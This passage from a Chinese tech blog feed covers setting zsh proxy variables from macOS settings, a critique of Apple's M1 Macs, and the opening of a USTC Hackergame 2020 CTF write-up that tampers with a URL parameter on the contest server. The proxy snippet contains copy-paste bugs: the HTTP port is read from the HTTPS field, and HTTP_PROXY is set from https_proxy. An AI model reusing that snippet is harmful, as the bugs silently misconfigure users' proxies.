: *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 